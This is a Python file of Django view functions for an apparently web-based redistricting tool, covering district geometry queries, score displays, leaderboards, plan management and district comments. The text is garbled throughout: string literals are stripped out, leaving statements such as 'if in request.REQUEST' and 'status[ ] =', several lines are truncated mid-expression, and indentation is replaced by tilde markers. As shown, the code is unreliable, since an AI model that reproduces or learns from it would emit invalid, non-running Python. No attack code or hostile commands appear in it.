~~~ """\n    Emulate a WFS service for versioned districts.\n\n    This function retrieves one version of the districts in a plan, with\n    the value of the subject attached to the feature. This function is\n    necessary because a traditional view could not be used to get the\n    districts in a versioned fashion.\n\n    This method accepts \'version__eq\' and \'subjects__eq\' URL parameters.\n\n    This method accepts an optional \'district_ids__eq\' parameter, which is\n    a comma-separated list of district_ids to filter by\n\n    Parameters:\n        request -- An HttpRequest, with the current user.\n        planid -- The plan ID from which to get the districts.\n\n    Returns:\n        A GeoJSON HttpResponse, describing the districts in the plan.\n    """ \n 
note_session_activity ( request ) \n 
\n 
status = { : } \n 
\n 
plan = Plan . objects . filter ( id = planid ) \n 
if plan . count ( ) == 1 : \n 
~~~ plan = plan [ 0 ] \n 
if in request . REQUEST : \n 
~~~ version = request . REQUEST [ ] \n 
~~ else : \n 
~~~ version = plan . version \n 
\n 
~~ subject_id = None \n 
if in request . REQUEST : \n 
~~~ subject_id = request . REQUEST [ ] \n 
~~ elif plan . legislative_body . get_default_subject ( ) : \n 
~~~ subject_id = plan . legislative_body . get_default_subject ( ) . id \n 
\n 
~~ geolevel = plan . legislative_body . get_geolevels ( ) [ 0 ] . id \n 
if in request . REQUEST : \n 
~~~ geolevel = int ( request . REQUEST [ ] ) \n 
\n 
~~ if in request . REQUEST : \n 
~~~ district_ids = request . REQUEST [ ] \n 
if len ( district_ids ) > 0 : \n 
~~~ district_ids = district_ids . split ( ) \n 
~~ else : \n 
~~~ district_ids = [ ] \n 
\n 
~~ ~~ if subject_id : \n 
~~~ bbox = None \n 
if in request . REQUEST : \n 
~~~ bbox = request . REQUEST [ ] \n 
# convert the request string into a tuple full of floats \n 
bbox = tuple ( map ( lambda x : float ( x ) , bbox . split ( ) ) ) \n 
~~ else : \n 
~~~ bbox = plan . district_set . all ( ) . extent ( field_name = ) \n 
\n 
~~ status [ ] = plan . get_wfs_districts ( version , subject_id , bbox , geolevel , district_ids ~~ else : \n 
~~~ status [ ] = [ ] \n 
status [ ] = _ ( ) \n 
~~ ~~ else : \n 
~~~ status [ ] = [ ] \n 
status [ ] = _ ( ) \n 
\n 
~~ return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
\n 
~~ def get_unlocked_simple_geometries ( request , planid ) : \n 
~~~ """\n    Emulate a WFS service for selecting unlocked geometries.\n\n    This function retrieves all unlocked geometries within a geolevel\n    for a given plan. This function is necessary because a traditional\n    view could not be used to obtain the geometries in a versioned fashion.\n\n    This method accepts \'version__eq\', \'level__eq\', and \'geom__eq\' URL parameters.\n\n    Parameters:\n    request -- An HttpRequest, with the current user.\n    planid -- The plan ID from which to get the districts.\n\n    Returns:\n    A GeoJSON HttpResponse, describing the unlocked simplified geometries\n    """ \n 
note_session_activity ( request ) \n 
\n 
status = { : } \n 
\n 
plan = Plan . objects . filter ( id = planid ) \n 
if plan . count ( ) == 1 : \n 
~~~ plan = plan [ 0 ] \n 
version = request . POST . get ( , plan . version ) \n 
geolevel = request . POST . get ( , plan . legislative_body . get_geolevels ( ) [ 0 ] . id ) \n 
geom = request . POST . get ( , None ) \n 
if geom is not None : \n 
~~~ try : \n 
~~~ wkt = request . POST . get ( , None ) \n 
geom = GEOSGeometry ( wkt ) \n 
\n 
~~ except GEOSException : \n 
~~~ wkt = request . REQUEST [ ] . replace ( , ) \n 
wkt = wkt . replace ( , ) . replace ( , ) \n 
try : \n 
~~~ geom = GEOSGeometry ( wkt ) \n 
~~ except GEOSException : \n 
\n 
~~~ geom = None \n 
\n 
# Selection is the geounits that intersects with the drawing tool used: \n 
# either a lasso, a rectangle, or a point \n 
~~ ~~ selection = Q ( geom__intersects = geom ) \n 
\n 
# Create a union of locked geometries \n 
districts = [ d . id for d in plan . get_districts_at_version ( version , include_geom = True ) if locked = District . objects . filter ( id__in = districts ) . collect ( ) \n 
\n 
# Create a simplified locked boundary for fast, but not completely accurate lookups \n 
# Note: the preserve topology parameter of simplify is needed here \n 
locked_buffered = locked . simplify ( 100 , True ) . buffer ( 100 ) if locked else None \n 
\n 
# Filter first by geolevel, then selection \n 
filtered = Geolevel . objects . get ( id = geolevel ) . geounit_set . filter ( selection ) \n 
# Assemble the matching features into geojson \n 
features = [ ] \n 
for feature in filtered : \n 
# We want to allow for the selection of a geometry that is partially split \n 
# with a locked district, so subtract out all sections that are locked \n 
~~~ geom = feature . simple \n 
\n 
# Only perform additional tests if the fast, innacurate lookup passed \n 
if locked and geom . intersects ( locked_buffered ) : \n 
\n 
\n 
~~~ if feature . geom . within ( locked ) : \n 
~~~ continue \n 
\n 
# Overlapping geometries are the ones we need to subtract pieces of \n 
~~ if feature . geom . overlaps ( locked ) : \n 
# Since this is just for display, do the difference on the simplified geometries ~~~ geom = geom . difference ( locked_buffered ) \n 
\n 
~~ ~~ features . append ( { \n 
# Note: OpenLayers breaks when the id is set to an integer, or even an integer string. # The id ends up being treated as an array index, rather than a property list key, and \n 
: % feature . id , \n 
: json . loads ( geom . json ) , \n 
: { \n 
: feature . name , \n 
: geolevel , \n 
: feature . id \n 
} \n 
} ) \n 
\n 
~~ status [ ] = features \n 
return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
~~ else : \n 
~~~ status [ ] = [ ] \n 
status [ ] = _ ( ) \n 
\n 
~~ ~~ else : \n 
~~~ status [ ] = [ ] \n 
status [ ] = _ ( ) \n 
\n 
~~ return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
~~ @ unique_session_or_json_redirect \n 
def get_statistics ( request , planid ) : \n 
~~~ note_session_activity ( request ) \n 
\n 
status = { : False } \n 
try : \n 
~~~ plan = Plan . objects . get ( pk = planid ) \n 
~~ except : \n 
~~~ status [ ] = _ ( \n 
"Couldn\'t get geography info from the server. No plan with the given id." ) \n 
return HttpResponse ( json . dumps ( status ) , mimetype = , status = 500 ) \n 
\n 
~~ if in request . REQUEST : \n 
~~~ try : \n 
~~~ version = int ( request . REQUEST [ ] ) \n 
~~ except : \n 
~~~ version = plan . version \n 
~~ ~~ else : \n 
~~~ version = plan . version \n 
\n 
~~ try : \n 
~~~ display = ScoreDisplay . objects . get ( legislative_body = plan . legislative_body , name = "%s_sidebar_demo" ~~ except : \n 
~~~ status [ ] = _ ( ) \n 
status [ ] = traceback . format_exc ( ) \n 
\n 
~~ if in request . REQUEST : \n 
~~~ try : \n 
~~~ display = ScoreDisplay . objects . get ( pk = request . POST [ ] ) \n 
~~ except : \n 
~~~ status [ ] = _ ( ) \n 
status [ ] = traceback . format_exc ( ) \n 
\n 
~~ ~~ else : \n 
~~~ logger . warn ( ) \n 
logger . warn ( str ( request . POST ) ) \n 
\n 
~~ try : \n 
~~~ html = display . render ( plan , request , version = version ) \n 
return HttpResponse ( html , mimetype = ) \n 
~~ except Exception , ex : \n 
~~~ status [ ] = _ ( "Couldn\'t render display tab." ) \n 
status [ ] = traceback . format_exc ( ) \n 
logger . warn ( "Couldn\'t render display tab" ) \n 
logger . debug ( , ex ) \n 
return HttpResponse ( json . dumps ( status ) , mimetype = , status = 500 ) \n 
\n 
\n 
~~ ~~ def getutc ( t ) : \n 
~~~ """\n    Given a datetime object, translate to a datetime object for UTC time.\n    """ \n 
t_tuple = t . timetuple ( ) \n 
t_seconds = time . mktime ( t_tuple ) \n 
return t . utcfromtimestamp ( t_seconds ) \n 
\n 
~~ @ unique_session_or_json_redirect \n 
def getdistrictfilestatus ( request , planid ) : \n 
~~~ """\n    Given a plan id, return the status of the district index file\n    """ \n 
note_session_activity ( request ) \n 
\n 
status = { : False } \n 
plan = Plan . objects . get ( pk = planid ) \n 
if not can_copy ( request . user , plan ) : \n 
~~~ return HttpResponseForbidden ( ) \n 
~~ try : \n 
~~~ is_shape = in request . REQUEST and request . REQUEST [ ] == \n 
file_status = DistrictFile . get_file_status ( plan , shape = is_shape ) \n 
status [ ] = True \n 
status [ ] = file_status \n 
~~ except Exception as ex : \n 
~~~ status [ ] = _ ( ) \n 
status [ ] = ex \n 
~~ return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
~~ @ unique_session_or_json_redirect \n 
def getdistrictfile ( request , planid ) : \n 
~~~ """\n    Given a plan id, email the user a zipped copy of \n    the district index file\n    """ \n 
note_session_activity ( request ) \n 
\n 
# Get the districtindexfile and create a response \n 
plan = Plan . objects . get ( pk = planid ) \n 
if not can_copy ( request . user , plan ) : \n 
~~~ return HttpResponseForbidden ( ) \n 
\n 
~~ is_shape = in request . REQUEST and request . REQUEST [ ] == \n 
file_status = DistrictFile . get_file_status ( plan , shape = is_shape ) \n 
if file_status == : \n 
~~~ if is_shape : \n 
~~~ archive = DistrictShapeFile . plan2shape ( plan ) \n 
~~ else : \n 
~~~ archive = DistrictIndexFile . plan2index ( plan ) \n 
~~ response = HttpResponse ( open ( archive . name ) . read ( ) , content_type = ) \n 
response [ ] = \'attachment; filename="%s.zip"\' % plan . get_friendly_name ( ) ~~ else : \n 
# Put in a celery task to create this file \n 
~~~ if is_shape : \n 
~~~ DistrictShapeFile . plan2shape . delay ( plan ) \n 
~~ else : \n 
~~~ DistrictIndexFile . plan2index . delay ( plan ) \n 
~~ response = HttpResponse ( _ ( \n 
) ) \n 
~~ return response \n 
\n 
~~ @ unique_session_or_json_redirect \n 
def emaildistrictindexfile ( request , planid ) : \n 
~~~ """\n    Given a plan id, email a zipped copy of the district \n    index file to a specified address\n    """ \n 
note_session_activity ( request ) \n 
\n 
if request . method != : \n 
~~~ return HttpResponseForbidden ( ) \n 
\n 
~~ plan = Plan . objects . get ( pk = planid ) \n 
if not can_copy ( request . user , plan ) : \n 
~~~ return HttpResponseForbidden ( ) \n 
\n 
# Put in a celery task to create the file and send the emails \n 
~~ DistrictIndexFile . emailfile . delay ( plan , request . user , request . POST , translation . get_language ( ) ) \n 
return HttpResponse ( json . dumps ( { \n 
: True , \n 
: _ ( ) } ) , \n 
mimetype = ) \n 
\n 
~~ def getvalidplans ( leg_body , owner = None ) : \n 
~~~ """\n    Returns the valid plans for a given legislative body and owner (optional)\n    """ \n 
pfilter = Q ( legislative_body = leg_body ) & Q ( is_valid = True ) \n 
if owner is not None : \n 
~~~ pfilter = pfilter & Q ( owner = owner ) \n 
\n 
~~ return list ( Plan . objects . filter ( pfilter ) ) \n 
\n 
~~ def getleaderboarddisplay ( leg_body , owner_filter ) : \n 
~~~ """\n    Returns the leaderboard ScoreDisplay given a legislative body and owner\n    """ \n 
try : \n 
~~~ return ScoreDisplay . objects . get ( name = "%s_leader_%s" % ( leg_body . name , owner_filter ) ) \n 
~~ except : \n 
~~~ return None \n 
\n 
~~ ~~ def getleaderboard ( request ) : \n 
~~~ """\n    Get the rendered leaderboard\n    """ \n 
note_session_activity ( request ) \n 
\n 
if not using_unique_session ( request . user ) : \n 
~~~ return HttpResponseForbidden ( ) \n 
\n 
~~ owner_filter = request . REQUEST [ ] \n 
body_pk = int ( request . REQUEST [ ] ) ; \n 
leg_body = LegislativeBody . objects . get ( pk = body_pk ) \n 
\n 
display = getleaderboarddisplay ( leg_body , owner_filter ) \n 
if display is None : \n 
~~~ return HttpResponse ( _ ( ) , mimetype = ) \n 
\n 
~~ plans = getvalidplans ( leg_body , request . user if owner_filter == else None ) \n 
\n 
try : \n 
~~~ html = display . render ( plans , request ) \n 
return HttpResponse ( html , mimetype = ) \n 
~~ except Exception , ex : \n 
~~~ logger . warn ( ) \n 
logger . debug ( , ex ) \n 
return HttpResponse ( str ( ex ) , mimetype = ) \n 
\n 
~~ ~~ def getleaderboardcsv ( request ) : \n 
~~~ """\n    Get the leaderboard scores in csv form\n    """ \n 
note_session_activity ( request ) \n 
\n 
if not using_unique_session ( request . user ) : \n 
~~~ return HttpResponseForbidden ( ) \n 
\n 
~~ owner_filter = request . REQUEST [ ] \n 
body_pk = int ( request . REQUEST [ ] ) ; \n 
leg_body = LegislativeBody . objects . get ( pk = body_pk ) \n 
plans = getvalidplans ( leg_body , request . user if owner_filter == else None ) \n 
\n 
display = getleaderboarddisplay ( leg_body , owner_filter ) \n 
plans = getvalidplans ( leg_body , request . user if owner_filter == else None ) \n 
\n 
panels = display . scorepanel_set . all ( ) . order_by ( ) \n 
\n 
try : \n 
# mark the response as csv, and create the csv writer \n 
~~~ response = HttpResponse ( mimetype = ) \n 
response [ ] = \n 
writer = csv . writer ( response ) \n 
\n 
# write headers \n 
writer . writerow ( [ , , ] + [ p . __unicode__ ( ) for p in panels ] ) \n 
\n 
# write row for each plan \n 
for plan in plans : \n 
~~~ row = [ plan . id , plan . name , plan . owner . username ] \n 
\n 
# add each score \n 
for panel in panels : \n 
~~~ function = panel . score_functions . all ( ) [ 0 ] \n 
score = ComputedPlanScore . compute ( function , plan ) \n 
row . append ( score [ ] ) \n 
\n 
# write the row \n 
~~ writer . writerow ( row ) \n 
\n 
~~ return response \n 
~~ except Exception , ex : \n 
~~~ logger . warn ( "Couldn\'t generate CSV of leaderboard." ) \n 
logger . debug ( , ex ) \n 
return HttpResponse ( str ( ex ) , mimetype = ) \n 
\n 
\n 
~~ ~~ def getplans ( request ) : \n 
~~~ """\n    Get the plans for the given user and return the data in a format readable\n    by the jqgrid\n    """ \n 
note_session_activity ( request ) \n 
\n 
if not using_unique_session ( request . user ) : \n 
~~~ return HttpResponseForbidden ( ) \n 
\n 
~~ if request . method == : \n 
~~~ page = int ( request . POST . get ( , 1 ) ) \n 
rows = int ( request . POST . get ( , 10 ) ) \n 
sidx = request . POST . get ( , ) \n 
sord = request . POST . get ( , ) \n 
owner_filter = request . POST . get ( ) ; \n 
body_pk = request . POST . get ( ) ; \n 
body_pk = int ( body_pk ) if body_pk else body_pk ; \n 
search = request . POST . get ( , False ) ; \n 
search_string = request . POST . get ( , ) ; \n 
is_community = request . POST . get ( , False ) == ; \n 
~~ else : \n 
~~~ return HttpResponseForbidden ( ) \n 
~~ end = page * rows \n 
start = end - rows \n 
\n 
if owner_filter == : \n 
~~~ available = Q ( is_template = True ) \n 
~~ elif owner_filter == : \n 
~~~ available = Q ( is_shared = True ) \n 
~~ elif owner_filter == : \n 
~~~ if request . user . is_anonymous ( ) : \n 
~~~ return HttpResponseForbidden ( ) \n 
~~ else : \n 
~~~ available = Q ( owner__exact = request . user ) \n 
~~ ~~ elif owner_filter == : \n 
~~~ available = Q ( is_template = True ) | Q ( is_shared = True ) \n 
if not request . user . is_anonymous ( ) : \n 
~~~ available = available | Q ( owner__exact = request . user ) \n 
~~ ~~ else : \n 
~~~ return HttpResponseBadRequest ( _ ( "Unknown filter method." ) ) \n 
\n 
~~ not_creating = ~ Q ( processing_state = ProcessingState . CREATING ) & ~ Q ( processing_state = ProcessingState \n 
# Set up the order_by parameter from sidx and sord in the request \n 
if sidx . startswith ( ) : \n 
~~~ sidx = sidx [ len ( ) : ] \n 
~~ if sidx == : \n 
~~~ sidx = \n 
~~ if sidx == : \n 
~~~ sidx = \n 
~~ if sord == : \n 
~~~ sidx = + sidx \n 
\n 
~~ if search : \n 
~~~ search_filter = Q ( name__icontains = search_string ) | Q ( description__icontains = search_string ~~ else : \n 
~~~ search_filter = None \n 
\n 
~~ if body_pk : \n 
~~~ body_filter = Q ( legislative_body = body_pk ) \n 
all_plans = Plan . objects . filter ( available , not_creating , body_filter , search_filter ) . order_by ~~ else : \n 
~~~ community_filter = Q ( legislative_body__is_community = is_community ) \n 
all_plans = Plan . objects . filter ( available , not_creating , search_filter , community_filter ) . order_by \n 
~~ if all_plans . count ( ) > 0 : \n 
~~~ total_pages = math . ceil ( all_plans . count ( ) / float ( rows ) ) \n 
~~ else : \n 
~~~ total_pages = 1 \n 
\n 
~~ plans = all_plans [ start : end ] \n 
# Create the objects that will be serialized for presentation in the plan chooser \n 
plans_list = list ( ) \n 
for plan in plans : \n 
~~~ plans_list . append ( { \n 
: plan . id , \n 
: { \n 
: plan . name , \n 
: plan . description , \n 
: time . mktime ( plan . edited . timetuple ( ) ) , \n 
: plan . is_template , \n 
: plan . is_shared , \n 
: plan . owner . username , \n 
: , # load dynamically -- this is a big performance hit \n 
: can_edit ( request . user , plan ) , \n 
: plan . legislative_body . get_long_description ( ) , \n 
: plan . get_processing_state_display ( ) \n 
} \n 
} ) \n 
\n 
~~ json_response = "{ \\"total\\":\\"%d\\", \\"page\\":\\"%d\\", \\"records\\":\\"%d\\", \\"rows\\":%s }" % ( total_pages return HttpResponse ( json_response , mimetype = ) \n 
\n 
~~ def get_shared_districts ( request , planid ) : \n 
~~~ """\n    Get the shared districts in a given plan and return the\n    data in a format readable by the jqgrid\n    """ \n 
note_session_activity ( request ) \n 
\n 
if not using_unique_session ( request . user ) : \n 
~~~ return HttpResponseForbidden ( ) \n 
\n 
~~ if request . method == : \n 
~~~ page = int ( request . POST . get ( , 1 ) ) \n 
rows = int ( request . POST . get ( , 10 ) ) \n 
~~ else : \n 
~~~ return HttpResponseForbidden ( ) \n 
\n 
~~ end = page * rows \n 
start = end - rows \n 
\n 
try : \n 
~~~ plan = Plan . objects . get ( pk = planid ) \n 
if not can_copy ( request . user , plan ) : \n 
~~~ return HttpResponseForbidden ( ) \n 
\n 
~~ all_districts = plan . get_districts_at_version ( plan . version , include_geom = False ) \n 
~~ except : \n 
~~~ plan = None \n 
all_districts = ( ) \n 
\n 
~~ if len ( all_districts ) > 0 : \n 
~~~ total_pages = math . ceil ( len ( all_districts ) / float ( rows ) ) \n 
~~ else : \n 
~~~ total_pages = 1 \n 
\n 
~~ districts = all_districts [ start : end ] \n 
# Create the objects that will be serialized for presentation in the plan chooser \n 
districts_list = list ( ) \n 
for district in districts : \n 
~~~ if not district . is_unassigned : \n 
~~~ districts_list . append ( { \n 
: district . id , \n 
: { \n 
: district . short_label , \n 
: district . long_label , \n 
: district . district_id , \n 
} \n 
} ) \n 
\n 
~~ ~~ json_response = "{ \\"total\\":\\"%d\\", \\"page\\":\\"%d\\", \\"records\\":\\"%d\\", \\"rows\\":%s }" % ( total_pages return HttpResponse ( json_response , mimetype = ) \n 
\n 
~~ @ login_required \n 
@ unique_session_or_json_redirect \n 
def editplanattributes ( request , planid ) : \n 
~~~ """\n    Edit the attributes of a plan. Attributes of a plan are the name and/or\n    description.\n    """ \n 
note_session_activity ( request ) \n 
\n 
status = { : False } \n 
if request . method != : \n 
~~~ return HttpResponseNotAllowed ( [ ] ) \n 
~~ new_name = request . POST . get ( , None ) \n 
new_description = request . POST . get ( , ) \n 
\n 
if not planid or not ( new_name or new_description ) : \n 
~~~ return HttpResponseBadRequest ( \n 
_ ( ) ) \n 
\n 
~~ plan = Plan . objects . filter ( pk = planid , owner = request . user ) \n 
if plan . count ( ) == 1 : \n 
~~~ plan = plan [ 0 ] \n 
if not new_name is None : \n 
~~~ plan . name = new_name \n 
\n 
~~ plan . description = new_description \n 
try : \n 
~~~ plan . save ( ) \n 
\n 
status [ ] = True \n 
status [ ] = _ ( ) \n 
~~ except Exception , ex : \n 
~~~ status [ ] = _ ( ) \n 
status [ ] = ex \n 
logger . warn ( ) \n 
logger . debug ( , ex ) \n 
~~ ~~ else : \n 
~~~ status [ ] = _ ( "Cannot edit a plan you don\'t own." ) \n 
~~ return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
~~ @ login_required \n 
@ unique_session_or_json_redirect \n 
def deleteplan ( request , planid ) : \n 
~~~ """\n    Delete a plan\n    """ \n 
note_session_activity ( request ) \n 
\n 
status = { : False } \n 
if request . method != : \n 
~~~ return HttpResponseNotAllowed ( [ ] ) \n 
\n 
~~ if not planid : \n 
~~~ return HttpResponseBadRequest ( _ ( ) ) \n 
\n 
~~ plan = Plan . objects . filter ( pk = planid , owner = request . user ) \n 
if plan . count ( ) == 1 : \n 
~~~ plan = plan [ 0 ] \n 
try : \n 
~~~ plan . delete ( ) \n 
status [ ] = True \n 
status [ ] = _ ( ) \n 
~~ except Exception , ex : \n 
~~~ status [ ] = _ ( ) \n 
status [ ] = ex \n 
logger . warn ( ) \n 
logger . debug ( , ex ) \n 
~~ ~~ else : \n 
~~~ status [ ] = _ ( "Cannot delete a plan you don\'t own." ) \n 
\n 
~~ return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
~~ @ login_required \n 
@ unique_session_or_json_redirect \n 
def reaggregateplan ( request , planid ) : \n 
~~~ """\n    Reaggregate a plan\n    """ \n 
note_session_activity ( request ) \n 
\n 
status = { : False } \n 
if request . method != : \n 
~~~ return HttpResponseNotAllowed ( [ ] ) \n 
\n 
~~ if not planid : \n 
~~~ return HttpResponseBadRequest ( _ ( ) ) \n 
\n 
~~ plan = Plan . objects . filter ( pk = planid , owner = request . user ) \n 
if plan . count ( ) == 1 : \n 
~~~ plan = plan [ 0 ] \n 
try : \n 
~~~ reaggregate_plan . delay ( plan . id ) \n 
\n 
# Set the reaggregating flag \n 
# (needed for the state to display on immediate refresh) \n 
plan . processing_state = ProcessingState . REAGGREGATING \n 
plan . save ( ) \n 
\n 
status [ ] = True \n 
status [ ] = _ ( ) \n 
~~ except Exception , ex : \n 
~~~ status [ ] = _ ( ) \n 
status [ ] = ex \n 
logger . warn ( ) \n 
logger . debug ( , ex ) \n 
~~ ~~ else : \n 
~~~ status [ ] = _ ( "Cannot reaggregate a plan you don\'t own." ) \n 
~~ return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
~~ def get_health ( request ) : \n 
~~~ def num_users ( minutes ) : \n 
~~~ users = 0 \n 
for session in Session . objects . all ( ) : \n 
~~~ try : \n 
~~~ decoded = session . get_decoded ( ) \n 
~~ except : \n 
\n 
~~~ session . delete ( ) \n 
continue \n 
\n 
~~ if in decoded : \n 
~~~ activity_delta = decoded [ ] - timedelta ( 0 , 0 , 0 , 0 , settings . SESSION_TIMEOUT if activity_delta > ( datetime . now ( ) - timedelta ( 0 , 0 , 0 , 0 , minutes ) ) : \n 
~~~ users += 1 \n 
~~ ~~ ~~ return users \n 
\n 
~~ try : \n 
~~~ result = _ ( ) % { : datetime . now ( ) } \n 
result += _ ( ) % { : Plan . objects . all ( ) . count ( ) } \n 
result += _ ( ) % { : Session . objects . all ( ) . count ( ) , \n 
: settings . CONCURRENT_SESSIONS } \n 
result += _ ( ) % { : num_users ( 10 ) } \n 
space = os . statvfs ( ) \n 
result += _ ( ) % { : ( ( space . f_bsize * space . f_bavail ) / ( 1024 * 1024 ) ) } \n 
result += _ ( ) % { : commands . getoutput ( ) } \n 
return HttpResponse ( result , mimetype = ) \n 
~~ except : \n 
~~~ return HttpResponse ( _ ( "ERROR! Couldn\'t get health:\\n%s" ) % traceback . format_exc ( ) ) \n 
\n 
\n 
~~ ~~ def statistics_sets ( request , planid ) : \n 
~~~ result = { : False } \n 
\n 
plan = Plan . objects . filter ( id = planid ) \n 
if plan . count ( ) == 0 : \n 
~~~ result [ ] = _ ( ) \n 
return HttpResponse ( json . dumps ( result ) , mimetype = ) \n 
~~ else : \n 
~~~ plan = plan [ 0 ] \n 
\n 
~~ if request . method == : \n 
~~~ sets = [ ] \n 
scorefunctions = [ ] \n 
\n 
# Get the functions available for the users \n 
user_functions = ScoreFunction . objects . filter ( selectable_bodies = plan . legislative_body ) . order_by for f in user_functions : \n 
~~~ if not in f . name . lower ( ) and not in f . name . lower ( ) : \n 
~~~ scorefunctions . append ( { : f . id , : force_escape ( f . get_label ( ) ) } ) \n 
~~ ~~ result [ ] = scorefunctions \n 
\n 
\n 
admin_display_names = [ \n 
"%s_sidebar_demo" % plan . legislative_body . name , \n 
] \n 
\n 
if plan . legislative_body . is_community : \n 
~~~ admin_display_names . append ( "%s_sidebar_comments" % \n 
plan . legislative_body . name ) \n 
~~ else : \n 
~~~ admin_display_names . append ( "%s_sidebar_basic" % \n 
plan . legislative_body . name ) \n 
# Get the admin displays \n 
~~ admin_displays = ScoreDisplay . objects . filter ( \n 
owner__is_superuser = True , \n 
legislative_body = plan . legislative_body , \n 
name__in = admin_display_names \n 
) \n 
\n 
for admin_display in admin_displays : \n 
~~~ sets . append ( { \n 
: admin_display . id , \n 
: force_escape ( admin_display . get_label ( ) ) , \n 
: [ ] , \n 
: False \n 
} ) \n 
\n 
~~ try : \n 
~~~ user_displays = ScoreDisplay . objects . filter ( \n 
owner = request . user , \n 
legislative_body = plan . legislative_body , \n 
is_page = False ) . order_by ( ) \n 
result [ ] = len ( user_displays ) \n 
for display in user_displays : \n 
~~~ functions = [ ] \n 
for panel in display . scorepanel_set . all ( ) : \n 
~~~ if panel . type == : \n 
~~~ functions = map ( lambda x : x . id , panel . score_functions . all ( ) ) \n 
if len ( functions ) == 0 : \n 
~~~ result [ ] = _ ( "No functions for %(panel)s" ) % { : panel } \n 
~~ ~~ ~~ sets . append ( { : display . id , : force_escape ( display . __unicode__ ( ) ) , ~~ ~~ except Exception , ex : \n 
~~~ result [ ] = _ ( ) % { : request . user } \n 
logger . warn ( ) \n 
logger . debug ( , ex ) \n 
\n 
~~ result [ ] = sets \n 
result [ ] = True \n 
# Delete the requested ScoreDisplay to make some room \n 
~~ elif request . method == and in request . POST : \n 
~~~ try : \n 
~~~ display = ScoreDisplay . objects . get ( pk = request . REQUEST . get ( , - 1 ) ) \n 
result [ ] = { : force_escape ( display . __unicode__ ( ) ) , : display . id } \n 
qset = display . scorepanel_set . all ( ) \n 
for panel in qset : \n 
~~~ if panel . displays . count ( ) == 1 : \n 
~~~ panel . delete ( ) \n 
~~ ~~ display . delete ( ) \n 
result [ ] = True \n 
~~ except Exception , ex : \n 
~~~ result [ ] = _ ( "Couldn\'t delete personalized scoredisplay" ) \n 
result [ ] = traceback . format_exc ( ) \n 
logger . warn ( "Couldn\'t delete personalized ScoreDisplay" ) \n 
logger . debug ( , ex ) \n 
\n 
\n 
# the id and name as usual \n 
~~ ~~ elif request . method == : \n 
\n 
~~~ def validate_num ( user , limit = 3 ) : \n 
~~~ return ScoreDisplay . objects . filter ( owner = user , legislative_body = plan . legislative_body , is_page \n 
~~ if in request . POST : \n 
~~~ functions = request . POST . getlist ( ) \n 
functions = map ( lambda x : int ( x ) , functions ) \n 
try : \n 
~~~ display = ScoreDisplay . objects . get ( title = request . POST . get ( ) , owner = request . user display = display . copy_from ( display = display , functions = functions ) \n 
~~ except : \n 
~~~ limit = 3 \n 
if validate_num ( request . user , limit ) : \n 
~~~ demo = ScoreDisplay . objects . filter ( \n 
owner__is_superuser = True , \n 
legislative_body = plan . legislative_body , \n 
is_page = False , \n 
title = "Demographics" \n 
) \n 
# DO NOT select the ScoreDisplay that contains \n 
# the comment calculator \n 
for disp in demo : \n 
~~~ has_comments = False \n 
for pnl in disp . scorepanel_set . all ( ) : \n 
~~~ for fn in pnl . score_functions . all ( ) : \n 
~~~ has_comments = has_comments or fn . calculator . endswith ( ) \n 
~~ ~~ if not has_comments : \n 
~~~ demo = disp \n 
break \n 
\n 
~~ ~~ display = ScoreDisplay ( ) \n 
display = display . copy_from ( display = demo , title = request . POST . get ( ) , owner = result [ ] = True \n 
~~ else : \n 
~~~ result [ ] = _ ( \n 
\n 
) % { : limit } \n 
result [ ] = \n 
return HttpResponse ( json . dumps ( result ) , mimetype = ) \n 
\n 
~~ ~~ result [ ] = { : force_escape ( display . __unicode__ ( ) ) , : display . id , result [ ] = True \n 
\n 
~~ else : \n 
~~~ result [ ] = _ ( "Didn\'t get functions in POST parameter" ) \n 
\n 
~~ ~~ return HttpResponse ( json . dumps ( result ) , mimetype = ) \n 
\n 
# \n 
# Comment views \n 
# \n 
~~ def purge_plan_clear_cache ( district , version ) : \n 
~~~ """\n    This is a helper method that purges a plan after a version, and clears\n    any pre-computed scores at the specified version.\n    """ \n 
district . plan . purge ( after = version ) \n 
\n 
district . plan . version = version \n 
district . plan . save ( ) \n 
\n 
cache = district . computeddistrictscore_set . filter ( function__calculator__endswith = ) \n 
cache . delete ( ) \n 
\n 
~~ @ unique_session_or_json_redirect \n 
def district_info ( request , planid , district_id ) : \n 
~~~ """\n    Get the comments that are attached to a district.\n\n    Parameters:\n        request -- An HttpRequest\n        planid -- The plan ID\n        district_id -- The district ID, this is the district number in a plan, and NOT the id of a district.\n    """ \n 
status = { : False } \n 
plan = Plan . objects . filter ( id = planid ) \n 
if plan . count ( ) == 0 : \n 
~~~ status [ ] = _ ( ) \n 
~~ else : \n 
~~~ plan = plan [ 0 ] \n 
\n 
version = plan . version \n 
if in request . REQUEST : \n 
~~~ try : \n 
~~~ version = int ( request . REQUEST [ ] ) \n 
version = min ( plan . version , int ( version ) ) \n 
~~ except : \n 
~~~ pass \n 
\n 
~~ ~~ district_id = int ( district_id ) \n 
district = plan . get_districts_at_version ( version , include_geom = False ) \n 
district = filter ( lambda d : d . district_id == district_id , district ) \n 
\n 
if request . method == : \n 
~~~ district = plan . district_set . get ( id = request . POST [ ] ) \n 
district . short_label = request . POST [ ] [ 0 : 10 ] \n 
district . long_label = request . POST [ ] [ 0 : 256 ] \n 
\n 
\n 
if district . version < version : \n 
# The district version may lag behind the cursor  \n 
# version if there were no edits for a while. If this  \n 
# is the case the district must be copied to the  \n 
# currently edited version. \n 
~~~ district_copy = copy . copy ( district ) \n 
district_copy . id = None \n 
district_copy . version = version \n 
\n 
district_copy . save ( ) \n 
\n 
# clone the characteristics, comments, and tags from  \n 
# the original district to the copy  \n 
district_copy . clone_relations_from ( district ) \n 
district = district_copy \n 
~~ else : \n 
# save the changes to the district -- maybe name change \n 
~~~ district . save ( ) \n 
\n 
~~ has_comment = in request . POST and request . POST [ ] != \n 
if has_comment : \n 
\n 
~~~ ct = ContentType . objects . get ( app_label = , model = ) \n 
Comment . objects . filter ( object_pk = district . id , content_type = ct ) . delete ( ) \n 
comment = Comment ( \n 
object_pk = district . id , \n 
content_type = ct , \n 
site_id = Site . objects . get_current ( ) . id , \n 
user_name = request . user . username , \n 
user_email = request . user . email , \n 
comment = request . POST [ ] ) \n 
comment . save ( ) \n 
